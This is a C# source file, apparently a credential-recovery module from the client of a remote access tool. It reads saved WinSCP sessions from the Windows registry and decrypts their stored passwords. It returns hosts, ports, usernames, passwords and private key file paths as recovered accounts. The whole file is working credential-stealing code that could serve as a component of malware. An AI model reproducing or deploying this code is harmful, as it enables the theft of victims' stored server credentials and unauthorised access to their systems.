using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using xClient.Core.Data;
using xClient.Core.Extensions;
using xClient.Core.Helper;

namespace xClient.Core.Recovery.FtpClients
{
    public class WinSCP
    {
        public static List<RecoveredAccount> GetSavedPasswords()
        {
            List<RecoveredAccount> data = new List<RecoveredAccount>();
            try
            {
                string regPath = @"SOFTWARE\\Martin Prikryl\\WinSCP 2\\Sessions";

                using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
                {
                    foreach (String subkeyName in key.GetSubKeyNames())
                    {
                        using (RegistryKey accountKey = key.OpenReadonlySubKeySafe(subkeyName))
                        {
                            if (accountKey == null) continue;
                            string host = accountKey.GetValueSafe("HostName");
                            if (string.IsNullOrEmpty(host)) continue;

                            string user = accountKey.GetValueSafe("UserName");
                            string password = WinSCPDecrypt(user, accountKey.GetValueSafe("Password"), host);
                            string privateKeyFile = accountKey.GetValueSafe("PublicKeyFile");
                            host += ":" + accountKey.GetValueSafe("PortNumber", "22");

                            if (string.IsNullOrEmpty(password) && !string.IsNullOrEmpty(privateKeyFile))
                                password = string.Format("[PRIVATE KEY LOCATION: \"{0}\"]", Uri.UnescapeDataString(privateKeyFile));

                            data.Add(new RecoveredAccount
                            {
                                URL = host,
                                Username = user,
                                Password = password,
                                Application = "WinSCP"
                            });
                        }
                    }
                }
                return data;
            }
            catch
            {
                return data;
            }
        }

        static int dec_next_char(List<string> list)
        {
            int a = int.Parse(list[0]);
            int b = int.Parse(list[1]);
            int f = (255 ^ (((a << 4) + b) ^ 0xA3) & 0xff);
            return f;
        }
        static string WinSCPDecrypt(string user, string pass, string host)
        {
            try
            {
                if (user == string.Empty || pass == string.Empty || host == string.Empty)
                {
                    return "";
                }
                string qq = pass;
                List<string> hashList = qq.Select(keyf => keyf.ToString()).ToList();
                List<string> newHashList = new List<string>();
                for (int i = 0; i < hashList.Count; i++)
                {
                    if (hashList[i] == "A")
                        newHashList.Add("10");
                    if (hashList[i] == "B")
                        newHashList.Add("11");
                    if (hashList[i] == "C")
                        newHashList.Add("12");
                    if (hashList[i] == "D")
                        newHashList.Add("13");
                    if (hashList[i] == "E")
                        newHashList.Add("14");
                    if (hashList[i] == "F")
                        newHashList.Add("15");
                    if ("ABCDEF".IndexOf(hashList[i]) == -1)
                        newHashList.Add(hashList[i]);
                }
                List<string> newHashList2 = newHashList;
                int length = 0;
                if (dec_next_char(newHashList2) == 255)
                    length = dec_next_char(newHashList2);
                newHashList2.Remove(newHashList2[0]);
                newHashList2.Remove(newHashList2[0]);
                newHashList2.Remove(newHashList2[0]);
                newHashList2.Remove(newHashList2[0]);
                length = dec_next_char(newHashList2);
                List<string> newHashList3 = newHashList2;
                newHashList3.Remove(newHashList3[0]);
                newHashList3.Remove(newHashList3[0]);
                int todel = dec_next_char(newHashList2) * 2;
                for (int i = 0; i < todel; i++)
                {
                    newHashList2.Remove(newHashList2[0]);
                }
                string password = "";
                for (int i = -1; i < length; i++)
                {
                    string data = ((char)dec_next_char(newHashList2)).ToString();
                    newHashList2.Remove(newHashList2[0]);
                    newHashList2.Remove(newHashList2[0]);
                    password = password + data;
                }
                string splitdata = user + host;
                int sp = password.IndexOf(splitdata, StringComparison.Ordinal);
                password = password.Remove(0, sp);
                password = password.Replace(splitdata, "");
                return password;
            }
            catch
            {
                return "";
            }
        }
    }
}
